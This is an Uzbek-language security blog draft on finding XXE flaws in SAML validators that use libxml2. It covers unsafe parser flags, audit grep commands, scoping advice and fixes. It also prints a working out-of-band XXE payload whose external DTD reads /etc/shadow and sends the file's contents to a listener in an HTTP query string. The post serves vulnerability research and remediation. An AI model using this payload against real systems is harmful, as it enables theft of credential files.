---
title: "SAML validatorlarida XXE: imzo tekshirilishidan oldin fayl o'qish"
date: 2026-08-14T10:30:00+05:00
tags: ["xxe", "saml", "methodology"]
slug: "saml-parser-xxe"
translationKey: saml-parser-xxe
draft: true
summary: "Nega SAML token validatorlari XXE uchun zaif nuqta, libxml2 sozlamalari ularni qanday sotib qo'yadi, va men buni qanday qidiraman."
---

SAML — bu XML, XML parserlari esa aytmasang tashqi entity'larni o'qiydi. Shu ikki faktni
yonma-yon qo'ysang, XXE topishning eng ishonchli joylaridan biri chiqadi: SAML tokenni
tekshiradigan kod.

Bu — aniq bug emas, bug klassi haqida writeup. Mahsulot yo'q, vendor yo'q. SAML gapiradigan
biror narsani audit qilsang — SSO integratsiyasi, token validatsiya xizmati, soket orqali
autentifikatsiya qiladigan agent — izlaydigan shakling shu.

## Nega aynan validator

SAML assertion tekshirilishidan oldin parse qilinishi shart. Tartib doim bir xil:

1. XML'ni hujjat daraxtiga parse qilish
2. Sxemani tekshirish
3. Subject, shartlar, vaqt belgilarini tekshirish
4. **Imzoni tekshirish**

Imzo — to'rtinchi qadam. Parse — birinchi. Parse paytida sodir bo'lgan hamma narsa imzoga
navbat kelgunча allaqachon bo'lib bo'lgan — XXE esa aynan parse paytida sodir bo'ladi.

Shuning uchun odatiy fikr, "token imzolangan, hujumchi unga tegolmaydi," bu yerda ahamiyatsiz.
Hujumchi ishonchli tokenni buzmayapti. U zararli tokenni yuboryapti, va zarar kodni rad
qiladigan qismgача yetib kelgunча yetkazilib bo'lgan. To'rtinchi qadamdagi yaroqsiz imzo —
juda kech.

```goat
  hujumchi token   .-------------.  entity ochiladi   .------------.
  (yomon imzo)   ->|  XML parse  |----- fayl o'qish ->|  /etc/...  |
                   '------+------'   HTTP exfil        '------------'
                          |
                          v
                   .-------------.
                   |  validatsiya|  <- imzo shu yerda, juda kech
                   '-------------'
```

## libxml2 tuzog'i

SAML'ni parse qiladigan C va C++ kodining ko'pi libxml2 ustida turadi, va bu ishning
buzilishi libxml2 flaglarida. Mas'uliyatli ko'rinadigan parse chaqiruvi:

```c
doc = xmlReadMemory(token, len, NULL, NULL,
                    XML_PARSE_NOENT   |   // entity'larni ochish
                    XML_PARSE_DTDATTR |   // DTD atributlarini qayta ishlash
                    XML_PARSE_DTDLOAD);   // tashqi DTD'larni yuklash
```

`XML_PARSE_NOENT` entity'larni ochadi. `XML_PARSE_DTDLOAD` tashqi DTD'larni yuklaydi. Birga
olganda — bu aynan XXE'ga kerak bo'lgan ikki narsa. Yetishmayotgani — `XML_PARSE_NONET`, ya'ni
parserni tarmoqqa chiqishdan to'xtatadigan yagona flag.

Xuddi shu narsani kutubxona darajasida hal qiladigan yana ikki global kalit bor, va ularga
tegmagan kod xavfli odatiy qiymatni meros qilib oladi:

```c
xmlSubstituteEntitiesDefault(1);   // 1 = ochish (eski koddagi xavfli odatiy)
xmlLoadExtDtdDefaultValue = 1;     // 1 = tashqi DTD'larni yuklash
```

Men tez-tez ko'radigan xato: manbada xavfsiz yo'l bor, lekin u hech qachon aniqlanmagan
`#ifdef` bilan o'ralgan. Dasturchi tuzatishni yozgan, "keyinга" deb build flagi ichiga
o'ragan, va aslida kompilyatsiya bo'ladigani — zaif `#else` shoxi. Manbani o'qish yetarli
emas — qaysi shox chiqarilganini bilishing kerak.

## Buni fayl o'qishga aylantirish

Tashqi DTD'larni yuklaydigan parse buni kuzatib boradi. Token o'zi bilan sen joylagan DTD'ga
ishora qiladigan parameter entity olib yuradi:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://127.0.0.1:9090/x.dtd">
  %dtd;
]>
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Version="2.0">
  <saml:Issuer>anything</saml:Issuer>
</saml:Assertion>
```

Sen qaytaradigan DTD lokal faylni o'qiydi va uni ikkinchi so'rovda tashqariga chiqaradi — bu
standart out-of-band naqsh, chunki fayl mazmuni parserning o'z chiqishida hech qachon
ko'rinmaydi:

```xml
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://127.0.0.1:9090/?d=%file;'>">
%wrap;
%exfil;
```

Parser DTD'ni oladi, faylni ochadi, va sening tinglovchingga fayl mazmunini query string'da
olib HTTP so'rov yuboradi. Agar validator imtiyozli foydalanuvchi ostida ishlasa, "fayl" —
o'sha foydalanuvchi o'qiy oladigan istalgan narsa.

Ekspluatatsiya bo'lishi uchun ikki tafsilot muhim:

- **To'g'ridan yoki out-of-band.** Agar parse natijasi senga qaytarilsa, oddiy `file:///`
  entity yetarli. Aks holda — validatorlar odatda tokenni rad qiladi — yuqoridagi
  parameter-entity DTD hiylasi kerak, shunda o'qigan narsa javob orqali emas, o'z kanaling
  orqali chiqadi.
- **Lokal fayllar ba'zi belgilarni saqlay olmaydi** entity ichida (`%`, `&`, yangi qator
  o'ramni buzishi mumkin). `/etc/passwd` kabi fayllar uchun yaxshi; noqulay baytli narsa
  uchun target stack ruxsat bersa PHP-`filter` uslubidagi base64 o'ramga o'tasan.

## Imzo yo'lda tursa

Ba'zan validator imzosiz tokenni parse ham qilmaydi — erta chiqib ketadi. O'sha yerda
ikkinchi, alohida zaiflik "balki" ni "ha" ga aylantiradi: imzo tekshiruvini o'tkazib
yuborishga majburlash mumkin bo'lgan autentifikatsiya yo'li.

Men buni "ishonchli chaqiruvchi" flagi sifatida ko'rganman — *bu token yuqorida allaqachon
tekshirilgan, qayta tekshirma* deydigan maydon — xizmat uni ishonchli bo'lmagan
chaqiruvchilardan qabul qiladi. O'zi bilan bu — auth bypass. XXE bilan birlashsa, oxirgi
to'siqni olib tashlaydi: parser sening kirishing ustida oldida hech narsa turmagan holda
ishlaydi.

Saboq — aniq flag emas. Saboq shu: validatordagi XXE'ni imzo tekshiruvi bor bo'lsa ham
quvish arziydi, chunki imzo tekshiruvlari aynan `// TODO: buni haqiqatan tekshir` olib
baribir chiqarib yuboriladigan narsa.

## Men buni qanday qidiraman

Manba bor bo'lsa:

```bash
# parse chaqiruvlari
grep -rn "xmlReadMemory\|xmlParseMemory\|xmlReadDoc\|xmlCtxtReadMemory" .
# global kalitlar
grep -rn "xmlSubstituteEntitiesDefault\|xmlLoadExtDtdDefaultValue" .
# build flagi ortiga yashiringan xavfsiz yo'llar
grep -rn "XML_PARSE_NONET" .        # keyin haqiqatan kompilyatsiya bo'lganini tekshir
```

Agar `XML_PARSE_NONET` DTD yuklaydigan parse'da yo'q bo'lsa, yoki faqat build hech qachon
o'rnatmaydigan `#ifdef` ichida bo'lsa — senda nomzod bor.

Black box: DTD'si sen boshqaradigan hostga ishora qiladigan token yubor va callback'ni
kuzat. Out-of-band tinglovchi — o'z HTTP serving, yoki Collaborator uslubidagi xizmat —
yagona ishonchli oracle, chunki validator deyarli doim tokenni rad qiladi va javobda senga
foydali hech narsa aytmaydi. Rad etish — kutilgan narsa. Callback — topilma.

## Chegaradan chiqmasdan tasdiqlash

Exfil'ni o'qishga ruxsating bor faylga yo'nalt — o'zingniki bo'lgan tizimda `/etc/hostname`
yoki o'zing tashlagan fayl — sirlarga emas, va sinash ruxsating yo'q infratuzilmada emas.
Callback entity ochilgani va o'qish sodir bo'lganini isbotlaydi; zaiflikni ko'rsatish uchun
`/etc/shadow` tortishing shart emas, birovning tizimida esa tortmasliging kerak. Mexanizmni
isbotla, to'xta, xabar ber.

## Tuzatish

Parser uchun: `XML_PARSE_NONET` qo'sh, va xavfsiz yo'lni yoqish uchun build flagiga tayanma —
uni shartsiz kompilyatsiya qil.

```c
doc = xmlReadMemory(token, len, NULL, NULL,
                    XML_PARSE_NOENT | XML_PARSE_DTDATTR | XML_PARSE_DTDLOAD
                    | XML_PARSE_NONET);
```

Undan ham yaxshisi, SAML validatorining tashqi DTD yuklashga umuman hojati yo'q — entity
ochilishini butunlay o'chir (`xmlSubstituteEntitiesDefault(0)`, `xmlLoadExtDtdDefaultValue = 0`)
va tarmoq o'chiq holda parse qil. Va qanaqadir "imzoni o'tkazib yubor" yo'li bo'lsa, u
chaqiruvchining haqiqatan imtiyozli ekaniga bog'lansin, chaqiruvchi o'zi o'rnatadigan flagga
emas.

## Xulosa

SAML ko'rsang, o'yla: *buni nima parse qiladi, va qaysi flaglar bilan?* Imzo — chalg'ituvchi
narsa; qiziqarli kod undan oldin ishlaydi. Parse chaqiruvini top, `XML_PARSE_NONET` borligini
tekshir, va yo'q bo'lsa — bitta out-of-band callback'gina seni bilishdan ajratib turadi.
